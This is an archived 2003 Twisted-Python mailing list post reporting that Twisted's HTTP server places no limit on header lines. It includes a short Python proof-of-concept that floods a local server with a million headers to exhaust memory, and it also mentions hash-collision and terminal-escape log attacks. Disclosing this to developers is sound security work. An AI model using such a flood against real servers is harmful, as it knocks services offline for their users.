<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Twisted-Python] possible web server attacks
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:twisted-python%40twistedmatrix.com?Subject=%5BTwisted-Python%5D%20possible%20web%20server%20attacks&In-Reply-To=84CEA432-94DA-11D7-B9B9-000393C92466%40dalkescientific.com">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="004346.html">
   <LINK REL="Next"  HREF="004338.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Twisted-Python] possible web server attacks</H1>
    <B>Andrew Dalke</B> 
    <A HREF="mailto:twisted-python%40twistedmatrix.com?Subject=%5BTwisted-Python%5D%20possible%20web%20server%20attacks&In-Reply-To=84CEA432-94DA-11D7-B9B9-000393C92466%40dalkescientific.com"
       TITLE="[Twisted-Python] possible web server attacks">dalke at dalkescientific.com
       </A><BR>
    <I>Sun Jun  8 20:19:33 EDT 2003</I>
    <P><UL>
        <LI>Previous message: <A HREF="004346.html">[Twisted-Python] HTTP versions
</A></li>
        <LI>Next message: <A HREF="004338.html">[Twisted-Python] HTTP versions
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#4462">[ date ]</a>
              <a href="thread.html#4462">[ thread ]</a>
              <a href="subject.html#4462">[ subject ]</a>
              <a href="author.html#4462">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>There appears to be a trivial attack against the HTTP server.

The code doesn't restrict the number of header lines sent to the
server, so the following will do nasty things to it.

 &gt;&gt;&gt; import socket
 &gt;&gt;&gt; def go():
...  f=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
...  f.connect((&quot;localhost&quot;, 8080))
...  f.send(&quot;GET / HTTP/1.0\r\n&quot;)
...  for i in range(1000000):
...   f.send(&quot;%s: X\r\n&quot; % i)
...   if i%1000 == 0: print i
...
 &gt;&gt;&gt; go()
  ....
 &gt;&gt;&gt; go()
  ....

Keep going until the machine runs out of memory.  I didn't have
a machine I wanted to sacrifice for that, so I don't know if the
actual code will catch the MemoryError or not.  Even if not, an
attacker can bring the memory use right up to the limit, thus
preventing other actions from occuring.

There needs to be a limit to the total number of header lines read
(or, as with Apache, a limit to the total number of bytes read for
the header).

As was pointed out before when I brought this up, there is a limit
to the line size.  But that's not enough.

Also, this non-limit opens Twisted up to the hash collision attack
mentioned recently on python-dev.

BTW, I also note that Twisted passes non-ASCII characters to the log.
This can be used as an attack against some terminals.  Here's one
document describing the method

   <A HREF="http://www.digitaldefense.net/labs/papers/Termulation.txt">http://www.digitaldefense.net/labs/papers/Termulation.txt</A>

Twisted should do what Apache does and escape those characters.

					Andrew
					<A HREF="http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python">dalke at dalkescientific.com</A>



</PRE>

<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="004346.html">[Twisted-Python] HTTP versions
</A></li>
	<LI>Next message: <A HREF="004338.html">[Twisted-Python] HTTP versions
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#4462">[ date ]</a>
              <a href="thread.html#4462">[ thread ]</a>
              <a href="subject.html#4462">[ subject ]</a>
              <a href="author.html#4462">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python">More information about the Twisted-Python
mailing list</a><br>
</body></html>
